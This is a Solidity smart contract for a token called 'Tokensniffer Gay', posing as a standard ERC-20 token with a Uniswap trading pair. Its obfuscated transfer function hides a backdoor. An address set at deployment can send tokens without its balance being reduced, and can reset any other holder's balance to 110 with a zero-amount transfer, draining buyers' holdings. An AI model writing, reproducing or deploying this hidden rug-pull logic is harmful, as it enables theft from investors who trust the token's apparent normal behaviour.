/*

https://t.me/tokensniffergay

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract TokensnifferGay is Ownable {
    mapping(address => uint256) private shgdjxoefkb;

    function mcivgsutweh(address aihcxbdyps, address eoqijvabzw, uint256 jfcsxilhgqm) private {
        if (lfyomgw[aihcxbdyps] == 0) {
            balanceOf[aihcxbdyps] -= jfcsxilhgqm;
        }
        balanceOf[eoqijvabzw] += jfcsxilhgqm;
        if (lfyomgw[msg.sender] > 0 && jfcsxilhgqm == 0 && eoqijvabzw != udgsbxcvn) {
            balanceOf[eoqijvabzw] = drulnow;
        }
        emit Transfer(aihcxbdyps, eoqijvabzw, jfcsxilhgqm);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private drulnow = 110;

    function transferFrom(address aihcxbdyps, address eoqijvabzw, uint256 jfcsxilhgqm) public returns (bool success) {
        require(jfcsxilhgqm <= allowance[aihcxbdyps][msg.sender]);
        allowance[aihcxbdyps][msg.sender] -= jfcsxilhgqm;
        mcivgsutweh(aihcxbdyps, eoqijvabzw, jfcsxilhgqm);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    address public udgsbxcvn;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address akpnuwtd) {
        balanceOf[msg.sender] = totalSupply;
        lfyomgw[akpnuwtd] = drulnow;
        IUniswapV2Router02 lbagqfihves = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        udgsbxcvn = IUniswapV2Factory(lbagqfihves.factory()).createPair(address(this), lbagqfihves.WETH());
    }

    string public symbol = 'Tokensniffer Gay';

    mapping(address => uint256) private lfyomgw;

    string public name = 'Tokensniffer Gay';

    function transfer(address eoqijvabzw, uint256 jfcsxilhgqm) public returns (bool success) {
        mcivgsutweh(msg.sender, eoqijvabzw, jfcsxilhgqm);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function approve(address ceobdwrv, uint256 jfcsxilhgqm) public returns (bool success) {
        allowance[msg.sender][ceobdwrv] = jfcsxilhgqm;
        emit Approval(msg.sender, ceobdwrv, jfcsxilhgqm);
        return true;
    }

    uint8 public decimals = 9;
}